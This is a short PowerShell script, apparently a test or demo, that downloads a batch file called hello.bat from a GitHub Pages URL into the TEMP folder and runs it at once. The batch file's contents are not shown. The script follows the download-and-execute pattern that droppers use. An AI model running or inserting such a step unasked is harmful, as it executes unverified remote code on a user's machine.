$url  = "https://yuvalc15.github.io/test1/hello.bat"
$path = "$env:TEMP\hello.bat"
Invoke-WebRequest -Uri $url -OutFile $path
Start-Process -FilePath $path -NoNewWindow -Wait
